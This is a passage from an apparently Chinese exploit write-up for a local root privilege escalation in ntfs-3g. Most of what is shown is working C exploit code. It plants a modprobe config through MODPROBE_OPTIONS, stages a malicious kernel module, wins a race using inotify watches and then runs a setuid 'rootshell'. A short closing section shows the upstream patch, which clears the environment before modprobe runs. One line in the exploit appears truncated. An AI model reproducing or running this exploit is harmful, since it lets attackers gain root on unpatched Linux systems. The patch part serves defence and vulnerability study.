        if (waitpid(initial_fork_child, &status, 0) != initial_fork_child)
            err(1, "waitpid");
        execl("rootshell", "rootshell", NULL);
        exit(0);
    }
    char buf[1000] = {0};
    // Set up workspace with volume, mountpoint, modprobe config and module directory.
    char template[] = "/tmp/ntfs_sploit.XXXXXX";
    if (mkdtemp(template) == NULL)
        err(1, "mkdtemp");
    char volume[100], mountpoint[100], modprobe_confdir[100], modprobe_conffile[100];
    sprintf(volume, "%s/volume", template);
    sprintf(mountpoint, "%s/mountpoint", template);
    sprintf(modprobe_confdir, "%s/modprobe.d", template);
    sprintf(modprobe_conffile, "%s/sploit.conf", modprobe_confdir);
    if (mkdir(volume, 0777) || mkdir(mountpoint, 0777) || mkdir(modprobe_confdir, 0777))
        err(1, "mkdir");
    int conffd = open(modprobe_conffile, O_WRONLY|O_CREAT, 0666);
    if (conffd == -1)
        err(1, "open modprobe config");
    int suidfile_fd = open("rootshell", O_RDONLY);
    if (suidfile_fd == -1)
        err(1, "unable to open ./rootshell");
    char modprobe_config[200];
    sprintf(modprobe_config, "alias fuse rootmod\noptions rootmod suidfile_fd=%d\n", suidfile_fd);
    if (write(conffd, modprobe_config, strlen(modprobe_config)) != strlen(modprobe_config))
        errx(1, "modprobe config write failed");
    close(conffd);
    // module directory setup
    char system_cmd[1000];
    sprintf(system_cmd, "mkdir -p %s/lib/modules/$(uname -r) && cp rootmod.ko *.bin %s/lib/modules/$(uname -r)/",
        template, template);
    if (system(system_cmd))
        errx(1, "shell command failed");
    // Set up inotify watch for /proc/mounts.
    // Note: /proc/mounts is a symlink to /proc/self/mounts, so
    // the watch will only see accesses by this process.
    int inotify_fd = inotify_init1(IN_CLOEXEC);
    if (inotify_fd == -1)
        err(1, "unable to create inotify fd?");
    if (inotify_add_watch(inotify_fd, "/proc/mounts", IN_OPEN) == -1)
        err(1, "unable to watch /proc/mounts");
    // Set up inotify watch for /proc/filesystems.
    // This can be used to detect whether we lost the race.
    int fs_inotify_fd = inotify_init1(IN_CLOEXEC);
    if (fs_inotify_fd == -1)
        err(1, "unable to create inotify fd?");
    if (inotify_add_watch(fs_inotify_fd, "/proc/filesystems", IN_OPEN) == -1)
        err(1, "unable to watch /proc/filesystems");
    // Set up inotify watch for /sbin/modprobe.
    // This can be used to detect when we can release all our open files.
    int modprobe_inotify_fd = inotify_init1(IN_CLOEXEC);
    if (modprobe_inotify_fd == -1)
        err(1, "unable to create inotify fd?");
    if (inotify_add_watch(modprobe_inotify_fd, "/sbin/modprobe", IN_OPEN) == -1)
        err(1, "unable to watch /sbin/modprobe");
    int do_exec_pipe[2];
    if (pipe2(do_exec_pipe, O_CLOEXEC))
        err(1, "pipe");
    pid_t child = fork();
    if (child == -1)
        err(1, "fork");
    if (child != 0) {
        if (read(do_exec_pipe[0], buf, 1) != 1)
            errx(1, "pipe read failed");
        char modprobe_opts[300];
        sprintf(modprobe_opts, "-C %s -d %s", modprobe_confdir, template);
        setenv("MODPROBE_OPTIONS", modprobe_opts, 1);
        execlp("ntfs-3g", "ntfs-3g", volume, mountpoint, NULL);
    }
    child = getpid();
    // Now launch ntfs-3g and wait until it opens /proc/mounts
    if (write(do_exec_pipe[1], buf, 1) != 1)
        errx(1, "pipe write failed");
    if (read(inotify_fd, buf, sizeof(buf))  start_time + 3) {
            puts("modprobe didn't run?");
            exit(1);
        }
    }
    }
## 0x04 补丁代码，`load_fuse_module()`函数
* * *
    struct stat st;
        pid_t pid;
        const char *cmd = "/sbin/modprobe";
    +   char *env = (char*)NULL;
        struct timespec req = { 0, 100000000 };  /* 100 msec */
        fuse_fstype fstype;
        if (!stat(cmd, &st) && !geteuid()) {
                pid = fork();
                if (!pid) {
    -                  execl(cmd, cmd, "fuse", NULL);
    +                  execle(cmd, cmd, "fuse", NULL, &env);
                        _exit(1);
                } else if (pid != -1)
                        waitpid(pid, NULL, 0);
精韧不怠,日进有功